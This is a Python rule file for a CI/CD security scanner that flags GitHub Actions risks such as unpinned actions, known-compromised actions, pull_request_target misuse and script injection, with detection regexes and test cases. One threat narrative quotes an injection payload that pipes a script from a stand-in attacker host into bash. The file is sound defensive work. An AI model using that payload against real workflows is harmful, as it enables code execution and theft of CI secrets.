"""GitHub Actions security rules — Dependency Chain Abuse and Poisoned Pipeline Execution.

These two categories cover the exact attack vectors used in documented supply chain campaigns.
"""

from taintly.models import (
    _YAML_BOOL_FALSE,
    CompromisedActionPattern,
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

RULES: list[Rule] = [
    # =========================================================================
    # CICD-SEC-3: Dependency Chain Abuse
    # =========================================================================
    Rule(
        id="SEC3-GH-001",
        title="Unpinned action (mutable tag reference)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Action referenced by mutable tag instead of commit SHA. Tags can be "
            "force-pushed to point at malicious code — a technique used in documented "
            "supply chain attacks against popular GitHub Actions (Trivy, Checkmarx, tj-actions)."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*([^@\s]+)@(?![a-f0-9]{40}\b)(\S+)",
            exclude=[
                r"^\s*#",
                r"docker://",
                r"uses:\s*\./",
                r"uses:\s*\.\./",
                # Dedup: branch refs (main/master/develop/dev) are already reported
                # at CRITICAL by SEC3-GH-002. Don't double-count as HIGH here too.
                r"uses:\s*[^@\s]+@(main|master|develop|dev)(\s|#|$)",
            ],
        ),
        remediation="Pin to full 40-char commit SHA: uses: org/action@<sha> # vtag",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
        test_positive=[
            "      - uses: actions/checkout@v4",
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      uses: actions/setup-node@v3.1.2",
        ],
        test_negative=[
            "      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4",
            "      - uses: ./local-action",
            "      - uses: ../shared-action",
            "      # uses: actions/checkout@v4",
            "      - uses: docker://alpine:3.18",
        ],
        stride=["T"],
        threat_narrative=(
            "Mutable tags can be force-pushed to point at entirely different commits without any "
            "record in your repository's history, silently changing what code your pipeline executes. "
            "This technique was used in the Trivy, tj-actions/changed-files, and Checkmarx supply "
            "chain compromises of 2024-2026."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    Rule(
        id="SEC3-GH-002",
        title="Action pinned to branch reference",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Action referenced by branch name (e.g., @main, @master). Branch references "
            "change with every commit — any push to the branch changes what your workflow runs. "
            "This is the most dangerous form of unpinned reference."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*[^@\s]+@(main|master|develop|dev)(\s*(#.*)?)?\s*$",
            exclude=[r"^\s*#", r"docker://", r"uses:\s*\./"],
        ),
        remediation="Pin to a specific commit SHA, not a branch name.",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
        test_positive=[
            "      - uses: some-org/deploy@main",
            "      - uses: company/action@master",
            "      - uses: org/tool@develop",
        ],
        test_negative=[
            "      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1",
            "      - uses: actions/checkout@v4",
            "      # uses: org/action@main",
        ],
        stride=["T"],
        threat_narrative=(
            "Branch references change with every commit, meaning any contributor to the action's "
            "repository can silently modify what your workflow runs by pushing a single commit. "
            "An attacker who gains temporary write access — via a compromised maintainer account — "
            "can substitute malicious code that runs with your workflow's full permissions and secrets."
        ),
    ),
    Rule(
        id="SEC3-GH-003",
        title="Known compromised action referenced",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "This workflow references an action that has been compromised in a documented "
            "supply chain attack. Verify you are using a confirmed safe version pinned to SHA."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*(aquasecurity/trivy-action|aquasecurity/setup-trivy|Checkmarx/kics-github-action|Checkmarx/ast-github-action|tj-actions/changed-files)@",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Consult the authoritative GitHub Security Advisory for each incident before "
            "re-enabling the action. Relevant advisories:\n"
            "  - tj-actions/changed-files: GHSA-mrrh-fwg8-r2c3 / CVE-2025-30066\n"
            "  - aquasecurity/trivy-action: GHSA-69fq-xp46-6x23 (Mar 2026)\n"
            "  - Checkmarx/kics-github-action: published via the GitHub Advisory Database\n"
            "Browse: https://github.com/advisories\n"
            "\n"
            "Pin to a confirmed-safe 40-char commit SHA published after remediation, or "
            "replace with an alternative tool. Audit the workflow's full history for the "
            "window the action was present — rotate any secret that the compromised "
            "version could have exfiltrated."
        ),
        reference="https://github.com/advisories",
        test_positive=[
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      - uses: tj-actions/changed-files@v35",
            "      - uses: Checkmarx/kics-github-action@v1.7.0",
        ],
        test_negative=[
            "      - uses: actions/checkout@v4",
            "      # uses: aquasecurity/trivy-action@v0.33.0",
        ],
        stride=["T", "I"],
        threat_narrative=(
            "This action was used in a confirmed supply chain attack where attackers modified it "
            "to silently exfiltrate CI secrets from all referencing workflows. "
            "Continuing to reference it keeps a known-compromised actor in your trust chain, "
            "even if you pin to a version predating the incident."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    # =========================================================================
    # SEC3-GH-004 — known-vulnerable version of action in use (precise match)
    # =========================================================================
    #
    # Distinct from SEC3-GH-003 (always-fire on the package): this rule
    # checks the pinned ``@<ref>`` against the bundled GHSA-sourced
    # advisory list and fires only when the ref is in the affected
    # version range.  ``tj-actions/changed-files@v40`` fires both this
    # AND SEC3-GH-003 (history + active-vulnerable); ``@v46.0.1``
    # (patched) fires SEC3-GH-003 only.  See ``taintly/data/
    # compromised_actions.json`` for the bundled list and
    # ``taintly/advisories.py`` for the matcher.
    Rule(
        id="SEC3-GH-004",
        title="Action pinned to a known-vulnerable version (active GHSA advisory)",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "The workflow pins an action to a ref that falls in the "
            "affected version range of a published GitHub Security "
            "Advisory.  Bundled list refreshed at release time from "
            "``GET /advisories?ecosystem=actions``; current entries "
            "cover the tj-actions/changed-files compromises "
            "(GHSA-mrrh-fwg8-r2c3 / CVE-2025-30066 and the GHSL-2023-271 "
            "command-injection class), the Reviewdog March 2025 "
            "compromise (GHSA-qmg3-hpqr-gqvc / CVE-2025-30154), and "
            "the aquasecurity/trivy-action incidents "
            "(GHSA-69fq-xp46-6x23 / CVE-2026-33634 and "
            "GHSA-9p44-j4g5-cfx5 / CVE-2026-26189)."
        ),
        pattern=CompromisedActionPattern(
            exclude=[
                r"^\s*#",
                r"uses:\s*\./",
                r"uses:\s*\.\./",
                r"docker://",
            ],
        ),
        remediation=(
            "1. Upgrade to the action's first patched version (consult "
            "the GHSA listed in the finding's ``Code:`` field for the "
            "exact bound).\n"
            "2. After upgrading, pin to a 40-char commit SHA published "
            "AFTER the remediation commit so a future tag-force-push "
            "cannot re-introduce the vulnerable version.\n"
            "3. Audit secrets the workflow had access to during the "
            "compromise window — rotate anything the action could have "
            "read.\n"
            "4. Review the full advisory text via "
            "``https://github.com/advisories/<ghsa-id>``."
        ),
        reference="https://github.com/advisories",
        test_positive=[
            # tj-actions/changed-files Mar-2025 compromise (<= 45.0.7).
            "      - uses: tj-actions/changed-files@v40",
            "      - uses: tj-actions/changed-files@v45.0.7",
            # tj-actions GHSL-2023-271 (< 41).
            "      - uses: tj-actions/changed-files@v35",
            # Reviewdog Mar-2025 compromise (== v1).
            "      - uses: reviewdog/action-setup@v1",
            # aquasecurity/trivy-action Trivy compromise (< 0.35.0).
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            # aquasecurity/setup-trivy (< 0.2.6) — same advisory.
            "      - uses: aquasecurity/setup-trivy@v0.2.0",
            # Trivy script-injection (>= 0.31.0, < 0.34.0).
            "      - uses: aquasecurity/trivy-action@v0.32.5",
        ],
        test_negative=[
            # Patched versions of the same actions — must NOT fire.
            "      - uses: tj-actions/changed-files@v46.0.1",
            "      - uses: tj-actions/changed-files@v45.0.8",
            "      - uses: aquasecurity/trivy-action@v0.35.0",
            "      - uses: aquasecurity/setup-trivy@v0.2.6",
            # Other actions entirely — never in advisory list.
            "      - uses: actions/checkout@v4",
            "      - uses: actions/setup-python@v5",
            # Local action and docker — excluded by patterns.
            "      - uses: ./local-action",
            "      - uses: docker://alpine:3.18",
            # Comment.
            "      # uses: tj-actions/changed-files@v40",
            # SHA pin — unparseable ref, conservatively does not fire.
            "      - uses: tj-actions/changed-files@a3b5c8d9e0f1234567890abcdef0123456789abcd",
            # Branch ref — unparseable, does not fire (SEC3-GH-002 covers).
            "      - uses: tj-actions/changed-files@main",
        ],
        stride=["T", "I", "E"],
        threat_narrative=(
            "An attacker who compromises a popular GitHub Action can "
            "exfiltrate every secret bound to every workflow that "
            "references it — across every consumer repository — for "
            "the duration of the attack window.  The "
            "tj-actions/changed-files March 2025 incident leaked "
            "secrets from thousands of public repositories within a "
            "single attack window because the malicious version was "
            "force-pushed onto the existing ``@v40`` / ``@v44`` mutable "
            "tags.  Pinning to a SHA published BEFORE the compromise "
            "does not save you if the SHA's content was rewritten in "
            "place via tag manipulation."
        ),
        incidents=[
            "tj-actions/changed-files (Mar 2025) — GHSA-mrrh-fwg8-r2c3",
            "tj-actions/changed-files (GHSL-2023-271) — GHSA-mcph-m25j-8j63",
            "Reviewdog (Mar 2025) — GHSA-qmg3-hpqr-gqvc",
            "Trivy supply chain (Mar 2026) — GHSA-69fq-xp46-6x23",
            "Trivy script-injection — GHSA-9p44-j4g5-cfx5",
        ],
    ),
    # =========================================================================
    # SEC3-GH-006 — third-party action inventory (review-needed)
    # =========================================================================
    #
    # Fires INFO once per ``uses: <pkg>@<ref>`` where ``<pkg>`` is NOT
    # under one of the trusted GitHub-published orgs (``actions/``,
    # ``github/``).  Built for the ``--baseline`` / ``--diff`` workflow:
    # initial scan lists every external dependency for one-time review;
    # subsequent scans surface only NEW dependencies as diff entries.
    #
    # Distinct from SEC3-GH-003 (always-fire on packages with confirmed
    # compromise history) and SEC3-GH-004 (fire on actually-vulnerable
    # versions): inventory has zero implicit threat assessment — it
    # surfaces the dependency surface so a human can decide.
    Rule(
        id="SEC3-GH-006",
        title="Third-party action used (inventory; review-needed)",
        severity=Severity.INFO,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        finding_family="Mutable dependency references",
        description=(
            "The workflow references a GitHub Action published outside "
            "the official ``actions/`` and ``github/`` organisations. "
            "External actions are supply-chain dependencies — every "
            "release ships executable code that runs with your "
            "workflow's full permissions and bound secrets.  Use "
            "``--baseline`` to snapshot the current set of third-party "
            "actions and ``--diff`` on subsequent scans to surface only "
            "new dependencies that need review.  Trusted-default orgs: "
            "``actions``, ``github``."
        ),
        pattern=RegexPattern(
            # uses: <org>/<repo>[/<sub>]@<ref>
            # — match orgs OTHER than actions/ and github/.
            # Negative lookahead anchors on the slash to prevent
            # matching ``actions-foundation/`` etc. as also-trusted.
            match=r"^\s*-?\s*uses:\s*(?!actions/)(?!github/)(?!\./)(?!\.\./)(?!docker://)([\w.-]+/[\w./-]+)@(\S+)",
            exclude=[
                r"^\s*#",
            ],
        ),
        remediation=(
            "Each finding is the *first* occurrence of an external "
            "action in this scan; review the action's repository, "
            "publisher, and recent commits, then snapshot the inventory "
            "with ``--baseline``.  After baseline, only NEW external "
            "actions surface in ``--diff`` output.  If your organisation "
            "publishes its own actions under a stable namespace and you "
            "trust them, suppress with ``# taintly: ignore[SEC3-GH-006]`` "
            "on the line, or add a path-scoped ignore in ``.taintly.yml``."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
        test_positive=[
            "      - uses: tj-actions/changed-files@v40",
            "      - uses: aquasecurity/trivy-action@v0.35.0",
            "      - uses: peter-evans/find-comment@v3",
            "      - uses: docker/build-push-action@v5",
            "      - uses: codecov/codecov-action@v3",
        ],
        test_negative=[
            # Trusted: actions/* and github/*.
            "      - uses: actions/checkout@v4",
            "      - uses: actions/setup-python@v5",
            "      - uses: github/codeql-action/init@v3",
            # Local action — not a third-party dependency.
            "      - uses: ./local-action",
            "      - uses: ../shared-action",
            # Docker image — separate concern, not in scope here.
            "      - uses: docker://alpine:3.18",
            # Comment.
            "      # uses: tj-actions/changed-files@v40",
        ],
        stride=["T"],
        threat_narrative=(
            "Third-party GitHub Actions execute with the workflow's "
            "full GITHUB_TOKEN scope and bound secrets at the time the "
            "workflow runs.  Every external action is supply-chain "
            "surface: a force-pushed tag, a maintainer takeover, or a "
            "compromised publisher account turns into immediate "
            "execution in your build environment.  This rule does not "
            "claim any specific action is malicious — it surfaces the "
            "external dependency set so a human reviewer can make the "
            "trust decision for each one, with ``--baseline`` / "
            "``--diff`` ensuring new additions don't slip through."
        ),
        confidence="medium",
    ),
    Rule(
        id="SEC3-GH-005",
        title="Docker container action without digest pinning",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Docker image referenced by tag instead of SHA256 digest. Image tags are mutable "
            "and can be overwritten on the registry."
        ),
        pattern=RegexPattern(
            match=r"(image|uses):\s*docker://[^@\s]+(?!.*@sha256:)",
            exclude=[r"^\s*#", r"@sha256:"],
        ),
        remediation="Pin Docker images to digest: docker://alpine@sha256:abcdef...",
        reference="https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
        test_positive=[
            "      uses: docker://alpine:3.18",
            "      image: docker://node:20-slim",
        ],
        test_negative=[
            "      uses: docker://alpine@sha256:abcdef1234567890abcdef1234567890",
            "      # uses: docker://alpine:3.18",
        ],
        stride=["T"],
        threat_narrative=(
            "Image tags are mutable pointers: registry operators or attackers who compromise the "
            "image repository can push a new image under the same tag, replacing your job's execution "
            "environment without any visible change in your workflow file. "
            "A compromised container image executes with full access to all runner secrets, "
            "source code, and build artifacts."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution
    # =========================================================================
    Rule(
        id="SEC4-GH-001",
        title="pull_request_target with untrusted PR checkout",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target AND checks out the PR author's code. "
            "This is the exact attack vector used in the Trivy supply chain compromise (March 2026). "
            "Attacker-controlled code executes with access to repo secrets and write permissions."
        ),
        pattern=ContextPattern(
            anchor=r"pull_request_target",
            requires=r"github\.event\.pull_request\.head\.(sha|ref)",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use 'pull_request' trigger instead. If secrets are required, use a two-workflow "
            "pattern: pull_request for build/test, workflow_run for privileged operations."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - run: echo 'just a comment'",
        ],
        stride=["E", "I"],
        threat_narrative=(
            "pull_request_target runs with the base repository's write permissions and full secret "
            "access, and checking out the PR author's code gives an external contributor arbitrary "
            "code execution in that privileged context. "
            "This is the exact pattern exploited in the March 2026 Trivy supply chain attack to "
            "exfiltrate repository secrets at scale from thousands of repositories."
        ),
        incidents=["Trivy supply chain (Mar 2026)", "Ultralytics (Dec 2024)"],
    ),
    Rule(
        id="SEC4-GH-002",
        title="pull_request_target trigger detected",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target which runs with write access to the base repo "
            "and access to secrets. Even without PR checkout, this trigger is inherently risky. "
            "Any future modification could introduce a PPE vulnerability."
        ),
        pattern=RegexPattern(
            match=r"pull_request_target",
            exclude=[r"^\s*#"],
        ),
        remediation="Use 'pull_request' trigger if write access is not required.",
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "  pull_request_target:",
            "    pull_request_target:",
            "on: [pull_request_target]",
        ],
        test_negative=[
            "  pull_request:",
            "  # pull_request_target:",
        ],
        stride=["E"],
        threat_narrative=(
            "pull_request_target grants write repository access and exposes secrets to all workflow "
            "steps, unlike pull_request which runs in a read-only context. "
            "Even without explicit PR code checkout today, any future careless modification of this "
            "workflow — such as adding actions/checkout — becomes a critical PPE vulnerability."
        ),
        incidents=["Trivy supply chain (Mar 2026)"],
    ),
    Rule(
        id="SEC4-GH-003",
        title="workflow_run without conclusion check",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow triggers on workflow_run but doesn't verify the triggering workflow "
            "succeeded. May process tainted artifacts from failed/compromised workflows."
        ),
        pattern=ContextPattern(
            anchor=r"workflow_run",
            requires=r"workflow_run",
            requires_absent=r"workflow_run\.conclusion",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Gate the triggered job on the upstream conclusion AND treat every artefact "
            "from the triggering workflow as untrusted — a successful `workflow_run` can "
            "still receive head_sha / artefacts produced by fork code:\n"
            "\n"
            "jobs:\n"
            "  deploy:\n"
            "    if: github.event.workflow_run.conclusion == 'success'\n"
            "    steps:\n"
            "      # Check out the BASE repo SHA, not github.event.workflow_run.head_sha\n"
            "      - uses: actions/checkout@<pinned-sha>\n"
            "        with:\n"
            "          ref: ${{ github.event.workflow_run.head_repository.default_branch }}\n"
            "      # Download artefacts into a scratch dir and validate before use\n"
            "      - uses: actions/download-artifact@<pinned-sha>\n"
            "        with:\n"
            "          path: ./untrusted/\n"
            "      - run: ./scripts/validate-artifacts.sh ./untrusted/\n"
            "\n"
            "See the GitHub Security Lab write-up on preventing `workflow_run` pwn "
            "requests for the full threat model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: deploy.sh",
        ],
        test_negative=[
            "on:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest",
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest",
        ],
        stride=["T"],
        threat_narrative=(
            "Processing artifacts from a failed or inconclusive upstream workflow may consume "
            "build outputs produced under compromised or partial conditions. "
            "An attacker who can trigger the upstream workflow to fail after partially completing "
            "can produce tainted artifacts that the privileged downstream workflow then ships."
        ),
    ),
    Rule(
        id="SEC4-GH-004",
        title="Script injection via attacker-controlled GitHub context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "User-controlled value injected directly into a run: block via ${{ }} expression. "
            "Attacker can craft PR titles, issue bodies, branch names, or commit messages "
            "containing shell commands that execute in the runner context."
        ),
        pattern=RegexPattern(
            match=r"\$\{\{\s*github\.(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body|review\.body|head_commit\.(message|author\.(email|name))|commits|pages)|head_ref)",
            exclude=[
                r"^\s*#",
                r"^\s*if:",
                # Exclude lines where the attacker-controlled value is the entire value of a YAML
                # key — e.g. `ref: ${{ github.head_ref }}` in a `with:` block passes a string to
                # an action, it does NOT execute shell code. The dangerous pattern is embedding
                # ${{ }} inside a larger string that gets passed to `run:`.
                r"""^\s*[\w.-]+:\s*["']?\$\{\{[^}]*\}\}["']?\s*(#.*)?$""",
            ],
        ),
        remediation=(
            "Pass the value through an environment variable so the "
            "${{ }} interpolation expands into the runner's env map, "
            "not into the generated step script:\n"
            "env:\n  TITLE: ${{ github.event.pull_request.title }}\n"
            'run: echo "$TITLE"\n'
            "For values passed to downstream tools that interpret their "
            "input (git, url construction, sqlite), validate against an "
            "allowlist after the env-var step. Run "
            "`taintly --guide SEC4-GH-004` for the full "
            "injection-vs-downstream-sanitization model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "${{ github.event.pull_request.title }}"',
            '        run: echo "${{ github.event.issue.body }}"',
            "        run: git checkout ${{ github.head_ref }}",
        ],
        test_negative=[
            '        if: github.event.pull_request.title != ""',
            '        run: echo "$TITLE"',
            '        # run: echo "${{ github.event.pull_request.title }}"',
            # ref: in a with: block is an action string param, not a shell command
            "        with:\n          ref: ${{ github.head_ref }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker can craft a PR title, issue body, or branch name containing shell "
            "metacharacters — such as `'; curl attacker.com/c2.sh | bash #` — that execute as "
            "commands when the value is interpolated into a run: block. "
            "The injected commands run with the workflow's full permissions including write access "
            "and all bound secrets."
        ),
        incidents=["Ultralytics (Dec 2024)", "Langflow (2024)"],
    ),
    Rule(
        id="SEC4-GH-005",
        title="Checkout persists credentials to disk",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "actions/checkout persists the GITHUB_TOKEN by default "
            "(`persist-credentials: true`). v4+ writes the token into a helper file "
            "under $RUNNER_TEMP and configures `.git/config` to reference it, so any "
            "subsequent step — including third-party actions — can read the token off "
            "disk and reuse it against the GitHub API without going through the secrets "
            "facility. Set `persist-credentials: false` unless the job needs to push "
            "commits from this clone."
        ),
        pattern=SequencePattern(
            pattern_a=r"uses:\s*actions/checkout@",
            absent_within=rf"persist-credentials:\s*{_YAML_BOOL_FALSE}",
            lookahead_lines=8,
            exclude=[r"^\s*#"],
        ),
        remediation="Add 'persist-credentials: false' to the checkout step.",
        reference="https://github.com/actions/checkout#usage",
        test_positive=[
            "      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0",
            "      - uses: actions/checkout@abc123def456abc123def456abc123def456abc1",
        ],
        test_negative=[
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false",
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: no",
            "      - uses: actions/checkout@v4\n        with:\n          persist-credentials: 'false'",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "The GITHUB_TOKEN persisted by actions/checkout (stored in a file under "
            "$RUNNER_TEMP and referenced from .git/config on v4+) can be read by any "
            "subsequent step — including third-party actions — from the filesystem "
            "without any secrets API call. With write repository permissions, a token "
            "extracted this way can push malicious commits, modify branch protections, "
            "or inject code into other workflows."
        ),
        # Persist-credentials: false can legitimately be supplied via a
        # YAML anchor merge (`<<: *checkout_opts`) whose body is defined
        # at the top of the file, outside the SequencePattern lookahead
        # window.  The anchor-aware suppression cross-checks against an
        # expanded copy of the source so the fix-by-anchor pattern
        # doesn't get reported as a false positive.
        anchor_aware=True,
    ),
    # =========================================================================
    # SEC3-GH-007: Docker image reference (services.<name>.image: or
    # container.image:) without SHA256 digest pin.
    #
    # GitHub-side counterpart of SEC3-GL-005.  The cross-tool corpus
    # (88 labelled rows across 12 repos) measured taintly's
    # ``unpinned_image`` recall at 0.25 vs zizmor's 0.75 — every miss
    # was a GitHub workflow with a tag-pinned ``services.<svc>.image:``
    # block (postgres, redis, etc.).  This rule closes that gap.
    #
    # Same pattern as the GitLab rule: ``image: <name>:<tag>`` fires
    # when no ``@sha256:`` digest is present.  Excludes commented-out
    # lines and digests-with-tags (``alpine:3.18@sha256:abc...``).
    # =========================================================================
    Rule(
        id="SEC3-GH-007",
        title="Docker service / container image without digest pinning",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitHub Actions workflow references a Docker image by tag "
            "(``image: postgres:15``) under a ``services.<name>:`` or "
            "top-level ``container:`` block.  Image tags are mutable: a "
            "registry push under the same tag silently swaps what runs "
            "alongside or as the host of every job.  Pin to an immutable "
            "SHA256 digest so the registry can't change the bytes "
            "executed by a future workflow run."
        ),
        pattern=RegexPattern(
            # Match `image: <name>[:<tag>]` lines that don't contain
            # a digest reference.  The trailing ``\s*$`` (with optional
            # comment) anchors at end-of-line so we don't match
            # ``image: foo  # comment`` style annotations partial-way.
            # Allow expressions in the tag portion (``:${{ matrix.x }}``)
            # — those still resolve to a mutable tag at runtime.
            match=r"^\s*image:\s*['\"]?[a-zA-Z0-9._/-]+(?::[a-zA-Z0-9._${}\s-]+)?['\"]?\s*(#.*)?$",
            exclude=[
                r"^\s*#",
                # Digest pin in any position on the line — safe.
                r"@sha256:",
                # Bare ``image:`` block opener (no value on same line).
                r"^\s*image:\s*$",
            ],
        ),
        remediation=(
            "Pin the image to a SHA256 digest:\n"
            "  services:\n"
            "    postgres:\n"
            "      image: postgres@sha256:abcdef...\n"
            "Resolve the digest with ``docker buildx imagetools inspect``\n"
            "or ``crane digest <image>:<tag>`` and Renovate / Dependabot\n"
            "can keep it current."
        ),
        reference="https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
        test_positive=[
            "      image: postgres:15-alpine",
            "      image: redis:6",
            "      image: postgis/postgis:${{ matrix.postgis-version }}",
            "      image: 'ghcr.io/example/app:latest'",
        ],
        test_negative=[
            "      image: postgres@sha256:abcdef1234567890",
            "      image: alpine:3.18@sha256:abcdef1234567890",
            "      # image: postgres:15-alpine",
            "    image:",  # bare opener — not a pin reference
        ],
        stride=["T"],
        threat_narrative=(
            "An attacker who controls the upstream registry image (compromised "
            "publisher, account takeover, typosquat under a similar tag) can "
            "replace the bytes pulled by your jobs without changing the workflow "
            "file.  Service containers run alongside the job with access to job "
            "secrets via service ``env:`` and shared ``volumes``; container-runtime "
            "jobs (``container.image:``) run AS that image.  Pinning to a SHA256 "
            "digest makes the image reference immutable and breaks this attack."
        ),
        incidents=[
            # No high-profile published incident specifically for GitHub Actions
            # services-image swaps yet; the threat is the same shape as
            # ``actions/*@v4`` tag mutability (SEC3-GH-001) and the
            # general Docker-image-tag attack class.
        ],
    ),
]
